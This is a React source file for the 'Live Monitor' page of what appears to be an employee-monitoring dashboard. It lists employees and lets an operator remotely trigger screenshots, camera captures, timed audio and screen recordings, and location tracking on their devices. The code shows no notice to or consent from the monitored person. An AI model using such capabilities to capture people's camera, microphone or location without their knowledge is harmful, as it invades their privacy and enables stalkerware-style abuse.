import { useState, useEffect } from 'react';
import { useDispatch, useSelector } from 'react-redux';
import {
  Box, Grid, Card, CardContent, Typography, Avatar, Chip, IconButton,
  Button, TextField, MenuItem, Alert, Tooltip, Dialog, DialogTitle,
  DialogContent, DialogActions
} from '@mui/material';
import {
  Refresh as RefreshIcon, CameraAlt as CameraIcon,
  Person as PersonIcon, Circle as CircleIcon,
  Videocam as VideoIcon, Mic as MicIcon, Stop as StopIcon,
  LocationOn as LocationIcon, ScreenShare as ScreenIcon
} from '@mui/icons-material';
import { setEmployees, setSelectedEmployee, setActivities, setStats } from '../store/dashboardSlice';
import { employeeAPI, activityAPI, reportAPI } from '../services/api';
import useWebSocket from '../hooks/useWebSocket';
import LiveScreenshots from '../components/Monitoring/LiveScreenshots';
import PageHeader from '../components/PageHeader';

const API_BASE = import.meta.env.VITE_API_URL || '';

const formatDuration = (ms) => {
  const hours = Math.floor(ms / 3600000);
  const minutes = Math.floor((ms % 3600000) / 60000);
  return `${hours}h ${minutes}m`;
};

export default function LiveMonitor() {
  const dispatch = useDispatch();
  const { employees, selectedEmployee, activities, onlineEmployees } = useSelector((state) => state.dashboard);
  const { isConnected, requestScreenshot, sendCommand } = useWebSocket();
  const [loading, setLoading] = useState(false);
  const [filter, setFilter] = useState('all');
  const [audioDialogOpen, setAudioDialogOpen] = useState(false);
  const [audioDuration, setAudioDuration] = useState(10);
  const [audioTargetEmployee, setAudioTargetEmployee] = useState(null);
  const [screenRecordDialogOpen, setScreenRecordDialogOpen] = useState(false);
  const [screenRecordDuration, setScreenRecordDuration] = useState(30);
  const [screenRecordTargetEmployee, setScreenRecordTargetEmployee] = useState(null);

  useEffect(() => {
    fetchEmployees();
    fetchActivities();
    const interval = setInterval(() => {
      fetchEmployees();
      fetchActivities();
    }, 15000);
    return () => clearInterval(interval);
  }, []);

  const fetchEmployees = async () => {
    try {
      const response = await employeeAPI.getAll();
      dispatch(setEmployees(response.data.data));
    } catch (error) {
      console.error('Failed to fetch employees:', error);
    }
  };

  const fetchActivities = async () => {
    try {
      const response = await activityAPI.getAll({ limit: 50 });
      dispatch(setActivities(response.data.data));
    } catch (error) {
      console.error('Failed to fetch activities:', error);
    }
  };

  const handleRefresh = async () => {
    setLoading(true);
    await Promise.all([fetchEmployees(), fetchActivities()]);
    setLoading(false);
  };

  const handleRequestScreenshot = (employeeId) => {
    requestScreenshot(employeeId);
  };

  const handleCaptureCamera = (employeeId) => {
    sendCommand(employeeId, 'capture_camera');
  };

  const handleRecordAudio = (employeeId) => {
    const target = employeeId || audioTargetEmployee?.employeeId || selectedEmployee?.employeeId;
    if (!target) return;
    sendCommand(target, 'record_audio', { duration: audioDuration });
    setAudioDialogOpen(false);
  };

  const handleStartScreenRecord = (employeeId) => {
    const target = employeeId || screenRecordTargetEmployee?.employeeId || selectedEmployee?.employeeId;
    if (!target) return;
    sendCommand(target, 'screen_record_start', { duration: screenRecordDuration });
    setScreenRecordDialogOpen(false);
  };

  const handleTrackLocation = (employeeId) => {
    sendCommand(employeeId, 'track_location');
  };

  const getOnlineStatus = (employee) => {
    if (employee.isOnline) return true;
    if (employee.lastSeen) {
      const diff = Date.now() - new Date(employee.lastSeen).getTime();
      return diff < 120000;
    }
    return false;
  };

  const filteredEmployees = employees.filter(emp => {
    if (filter === 'online') return getOnlineStatus(emp);
    if (filter === 'offline') return !getOnlineStatus(emp);
    return true;
  });

  return (
    <Box>
      <PageHeader
        icon={<ScreenIcon />}
        title="Live Monitor"
        subtitle="Watch devices, push commands and stream captures in real time"
        actions={
          <>
            <TextField select size="small" value={filter} onChange={(e) => setFilter(e.target.value)} sx={{ minWidth: 130 }}>
              <MenuItem value="all">All</MenuItem>
              <MenuItem value="online">Online</MenuItem>
              <MenuItem value="offline">Offline</MenuItem>
            </TextField>
            <IconButton onClick={handleRefresh} disabled={loading} sx={{ border: '1px solid rgba(148,163,184,0.22)' }}>
              <RefreshIcon />
            </IconButton>
          </>
        }
      />

      <LiveScreenshots liveEmployees={onlineEmployees} />

      <Grid container spacing={3}>
        <Grid item xs={12} md={8}>
          <Card>
            <CardContent>
              <Typography variant="h6" gutterBottom>Employees</Typography>
              <Box sx={{ maxHeight: 600, overflow: 'auto' }}>
                {filteredEmployees.map((employee) => (
                  <Box
                    key={employee.employeeId}
                    onClick={() => dispatch(setSelectedEmployee(employee))}
                    sx={{
                      display: 'flex', alignItems: 'center', p: 2, mb: 1, borderRadius: 2,
                      cursor: 'pointer', border: selectedEmployee?.employeeId === employee.employeeId ? '2px solid #06b6d4' : '1px solid #27272a',
                      '&:hover': { backgroundColor: 'action.hover' }
                    }}
                  >
                    <Avatar sx={{ mr: 2, bgcolor: getOnlineStatus(employee) ? 'success.main' : 'grey.500' }}>
                      {employee.name?.charAt(0) || 'E'}
                    </Avatar>
                    <Box sx={{ flexGrow: 1 }}>
                      <Typography fontWeight="medium">{employee.name}</Typography>
                      <Typography variant="caption" color="text.secondary">
                        {employee.employeeId} | {employee.department || 'General'}
                      </Typography>
                    </Box>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
                      <Chip
                        size="small"
                        label={getOnlineStatus(employee) ? 'Online' : 'Offline'}
                        color={getOnlineStatus(employee) ? 'success' : 'default'}
                      />
                      {getOnlineStatus(employee) && (
                        <>
                          <Tooltip title="Screenshot">
                            <IconButton size="small" onClick={(e) => { e.stopPropagation(); handleRequestScreenshot(employee.employeeId); }}>
                              <CameraIcon fontSize="small" />
                            </IconButton>
                          </Tooltip>
                          <Tooltip title="Camera Capture">
                            <IconButton size="small" onClick={(e) => { e.stopPropagation(); handleCaptureCamera(employee.employeeId); }}>
                              <VideoIcon fontSize="small" />
                            </IconButton>
                          </Tooltip>
                          <Tooltip title="Record Audio">
                            <IconButton size="small" onClick={(e) => { e.stopPropagation(); setAudioTargetEmployee(employee); dispatch(setSelectedEmployee(employee)); setAudioDialogOpen(true); }}>
                              <MicIcon fontSize="small" />
                            </IconButton>
                          </Tooltip>
                          <Tooltip title="Screen Record">
                            <IconButton size="small" onClick={(e) => { e.stopPropagation(); setScreenRecordTargetEmployee(employee); dispatch(setSelectedEmployee(employee)); setScreenRecordDialogOpen(true); }}>
                              <ScreenIcon fontSize="small" />
                            </IconButton>
                          </Tooltip>
                          <Tooltip title="Track Location">
                            <IconButton size="small" onClick={(e) => { e.stopPropagation(); handleTrackLocation(employee.employeeId); }}>
                              <LocationIcon fontSize="small" />
                            </IconButton>
                          </Tooltip>
                        </>
                      )}
                    </Box>
                  </Box>
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>

        <Grid item xs={12} md={4}>
          <Card sx={{ mb: 3 }}>
            <CardContent>
              <Typography variant="h6" gutterBottom>Connection Status</Typography>
              <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                <CircleIcon sx={{ color: isConnected ? 'success.main' : 'error.main', fontSize: 12 }} />
                <Typography>{isConnected ? 'Connected to Server' : 'Disconnected'}</Typography>
              </Box>
              <Typography variant="body2" color="text.secondary" sx={{ mt: 1 }}>
                Online Employees: {employees.filter(e => getOnlineStatus(e)).length} / {employees.length}
              </Typography>
            </CardContent>
          </Card>

          {selectedEmployee && (
            <Card sx={{ mb: 3 }}>
              <CardContent>
                <Typography variant="h6" gutterBottom>Selected Employee</Typography>
                <Box sx={{ textAlign: 'center', mb: 2 }}>
                  <Avatar sx={{ width: 64, height: 64, mx: 'auto', mb: 1, bgcolor: 'primary.main' }}>
                    {selectedEmployee.name?.charAt(0) || 'E'}
                  </Avatar>
                  <Typography fontWeight="bold">{selectedEmployee.name}</Typography>
                  <Typography variant="caption" color="text.secondary">{selectedEmployee.employeeId}</Typography>
                </Box>
                <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1 }}>
                  <Chip label={`Department: ${selectedEmployee.department || 'General'}`} size="small" />
                  <Chip label={`Group: ${selectedEmployee.group || 'Default'}`} size="small" variant="outlined" />
                  <Chip
                    label={getOnlineStatus(selectedEmployee) ? 'Online' : 'Offline'}
                    color={getOnlineStatus(selectedEmployee) ? 'success' : 'default'}
                    size="small"
                  />
                </Box>
                {getOnlineStatus(selectedEmployee) && (
                  <Box sx={{ display: 'flex', gap: 0.5, mt: 2, flexWrap: 'wrap' }}>
                    <Button size="small" startIcon={<CameraIcon />} onClick={() => handleRequestScreenshot(selectedEmployee.employeeId)}>Screenshot</Button>
                    <Button size="small" startIcon={<VideoIcon />} onClick={() => handleCaptureCamera(selectedEmployee.employeeId)}>Camera</Button>
                    <Button size="small" startIcon={<MicIcon />} onClick={() => { setAudioTargetEmployee(selectedEmployee); setAudioDialogOpen(true); }}>Audio</Button>
                    <Button size="small" startIcon={<ScreenIcon />} onClick={() => { setScreenRecordTargetEmployee(selectedEmployee); setScreenRecordDialogOpen(true); }}>Record</Button>
                    <Button size="small" startIcon={<LocationIcon />} onClick={() => handleTrackLocation(selectedEmployee.employeeId)}>Location</Button>
                  </Box>
                )}
              </CardContent>
            </Card>
          )}

          <Card>
            <CardContent>
              <Typography variant="h6" gutterBottom>Recent Activity</Typography>
              <Box sx={{ maxHeight: 300, overflow: 'auto' }}>
                {activities.slice(0, 10).map((activity, index) => (
                  <Box key={index} sx={{ py: 1, borderBottom: '1px solid #27272a' }}>
                    <Typography variant="body2" fontWeight="medium">{activity.appName || activity.appPackage}</Typography>
                    <Typography variant="caption" color="text.secondary">
                      {activity.employeeId} | {formatDuration(activity.durationMs || 0)}
                    </Typography>
                  </Box>
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      </Grid>

      <Dialog open={audioDialogOpen} onClose={() => setAudioDialogOpen(false)}>
        <DialogTitle>Record Audio {audioTargetEmployee ? `(${audioTargetEmployee.name || audioTargetEmployee.employeeId})` : ''}</DialogTitle>
        <DialogContent>
          <TextField
            label="Duration (seconds)"
            type="number"
            fullWidth
            value={audioDuration}
            onChange={(e) => setAudioDuration(parseInt(e.target.value) || 10)}
            sx={{ mt: 1 }}
          />
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setAudioDialogOpen(false)}>Cancel</Button>
          <Button variant="contained" onClick={() => handleRecordAudio()}>Start Recording</Button>
        </DialogActions>
      </Dialog>

      <Dialog open={screenRecordDialogOpen} onClose={() => setScreenRecordDialogOpen(false)}>
        <DialogTitle>Screen Recording {screenRecordTargetEmployee ? `(${screenRecordTargetEmployee.name || screenRecordTargetEmployee.employeeId})` : ''}</DialogTitle>
        <DialogContent>
          <TextField
            label="Duration (seconds)"
            type="number"
            fullWidth
            value={screenRecordDuration}
            onChange={(e) => setScreenRecordDuration(parseInt(e.target.value) || 30)}
            sx={{ mt: 1 }}
          />
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setScreenRecordDialogOpen(false)}>Cancel</Button>
          <Button variant="contained" onClick={() => handleStartScreenRecord()}>Start Recording</Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}
